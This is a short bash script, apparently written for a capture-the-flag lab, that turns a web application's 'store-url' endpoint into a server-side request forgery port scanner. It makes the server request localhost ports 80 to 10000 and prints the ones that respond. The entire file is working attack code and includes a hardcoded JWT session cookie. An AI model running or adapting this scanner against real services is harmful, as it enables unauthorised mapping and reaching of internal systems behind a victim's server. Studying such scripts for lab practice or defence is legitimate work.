#! /bin/bash

# change this
JWT='jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImZhYmlvQGdtYWlsLmNvbSIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc1NDMxNjMzMywiZXhwIjoxNzU0MzE5OTMzfQ.oE057ENp2Cse20Y-kPX06aWAYMeEEacwNcQGDEWcN4w'

for i in $(seq 80 10000); do
    URL="http://localhost:${i}"
    RESULT=$(curl http://storage.cloudsite.thm/api/store-url -X POST --json "{\"url\":\"$URL\"}" -H "Cookie: $JWT" -s | jq '.message' | sed 's/"//g')
    python3 -c "print(\"Checking port ${i}\", end=\"\r\")"
    if [[ ${RESULT} == "File stored from URL successfully" ]]; then
        echo "Found open local port $i"
    fi
done 